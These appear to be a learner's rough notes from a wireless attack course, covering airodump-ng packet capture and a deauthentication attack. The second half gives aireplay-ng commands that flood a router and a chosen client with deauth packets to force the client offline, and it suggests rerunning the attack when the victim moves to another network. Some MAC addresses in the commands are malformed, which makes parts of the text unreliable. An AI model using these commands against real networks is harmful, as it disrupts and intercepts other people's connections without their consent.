Packet Sniffing -PRECONECTION ATTACKS
USE 	Airodump-ng
part of aircrack-ng suit
use to capture packect
display informat relasted to network
connectyed clients
use  command "airodump-ng"
in monitor mode

ESSID IT SHOW NAMES OF WIRELESS NETWORK

BSSID SHOW MAC ADDRESS
 
PWR SHOW SIGNAL STRENGTH HIGHER NUM MORE STRONG

beacon sends frames tell it exists even if hidden
MB maximum speed supported by network
enc is encryption used for e.g wep wep2

 WiFi Bands - 2.4Ghz & 5Ghz Frequencies
previously we could only see 2.4 band using airodumpo-ng
sniffing 5 giga hertz


airodump-ng --band a wlan0 a show 5 giga hertz
airodump-ng --band abg wlan0 show 2.4/5giga hertz same time
problem slow using abg need powerfull adapter slightly slower better to sniff independent

Targeted Packet Sniffing

airodump-ng --bssid C8:5A:9F:F1:57:B7 --channel 11 --write test wlan0 
telling airmon to sniff targeted network telling bssid and channel --write test wlan0 data in file
show one network
bellow u can see all devices connected

then run command ls u can see airodump store data in file 
esktop    Pictures    test-01.kismet.netxml
Documents  Public     test-01.cap                       test-01.log.csv
Downloads  Templates  test-01.csv
Music      Videos     test-01.kismet.csv

main file we will use is test-01cap store info everthing these device did on internet
problem data is encrypted wep2 use less data bcz encrypted 
us full thing we can see device manufacturer
we can kind a guiess but not enough info
 

Deauthentication Attack 

disconnect any device from the internet without even connecting to it works on wep wpa wep2
no need to know network key
method 
pretend to be the client by changing mac to the client tell router i want to disconnect from you the pretend to router changing mac to router tell client u req to disconnect i am disconnecting you 
use:
aireplay-ng --deauth [deauth packets 100000 large num] -aq [network mac]-c [target mac] [interface]
aireplay-ng --deauth 100000000 -a O8:5A:4F:F1:E7:G7 -c 9C:28:F7:61:BF:BC wlan0
if 5g network 
aireplay-ng --deauth 100000000 -a M8:5P:9F:F1:07:B7 -c 9C:28:F7:61:BF:BC -D wlan0

if u attack using this client would  disconnect from network but join mobile data or other wiff 
solution open another terminal run command again change network bssid[new network id ]
larege num bcz it keep sending lare amount of packects to router and device
-a specify router mac adrres - c specify client
airodump-ng --bssid C7:DA:VF:L1:57:B7 --channel 11 wlan0
run this in seprate terminator
aireplay-ng --deauth 1000000 -a C7:DA:vF:l1:57:B7 -c cC:28:Fy7:6o1:0F:rC wlan0

small attack use to plug in other attacks
